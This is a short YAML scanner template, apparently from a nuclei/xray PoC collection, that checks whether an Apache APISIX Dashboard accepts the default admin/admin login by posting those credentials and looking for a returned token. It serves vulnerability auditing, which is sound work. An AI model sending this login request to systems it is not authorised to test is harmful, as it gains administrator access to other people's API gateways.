name: poc-yaml-apache-apisix-default-login
rules:
  - method: POST
    path: /apisix/admin/user/login
    headers:
      Accept: application/json
      Content-Type: application/json;charset=UTF-8
    body: |
      {"username":"admin","password":"admin"}
    expression: |
      response.status == 200 && response.content_type.icontains("json") && response.body.bcontains(b"\"code\":0") && response.body.bcontains(b"\"token\"") && response.body.bcontains(b"\"data\"")
detail:
  author: adysec/nuclei_poc
  description: Apache APISIX Dashboard default admin/admin credential check
  links:
    - https://github.com/adysec/nuclei_poc
    - https://apisix.apache.org/
